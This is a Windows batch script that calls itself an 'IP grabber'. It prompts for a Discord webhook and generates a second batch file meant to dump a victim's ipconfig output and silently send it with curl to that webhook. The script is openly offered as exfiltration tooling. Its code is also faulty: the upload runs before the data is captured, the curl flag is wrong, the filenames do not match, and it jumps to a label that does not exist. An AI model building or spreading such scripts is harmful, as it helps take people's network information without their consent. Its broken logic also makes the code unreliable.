@echo off
cls
chcp 65001 >nul
title Ip Grabber Script
color d

:menu
echo(
echo(
echo   ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
echo  ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
echo  ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
echo  ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
echo  ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║ 
echo   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ made by Lachlan Newbigging
echo(
echo(
 set /p input=~

    if %input%==1 goto Grabber

:Grabber
cls
echo  ██╗███╗   ██╗███████╗ ██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
echo  ██║████╗  ██║██╔════╝██╔═══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
echo  ██║██╔██╗ ██║█████╗  ██║   ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
echo  ██║██║╚██╗██║██╔══╝  ██║   ██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
echo  ██║██║ ╚████║██║     ╚██████╔╝    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
echo  ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                           
set /p webhook=Enter your discord webhook: 

if %webhook%==""  (
    echo discord webhook URL is required.
    pause
    goto menu

)

echo connectiong (true) Making ip logger Script
timeout 5 >nul

echo @echo off > ip_grabber_exect.bat
echo curl --silent --output /dev/null -f 1=@ip.txt %webhook% >> Ip_grabber_exect.bat
echo ipconfig ^>ip.txt >> ip_grabber_exect.bat

echo Ip grabber script has been created as ip_grabber_exect.bat
pause
goto main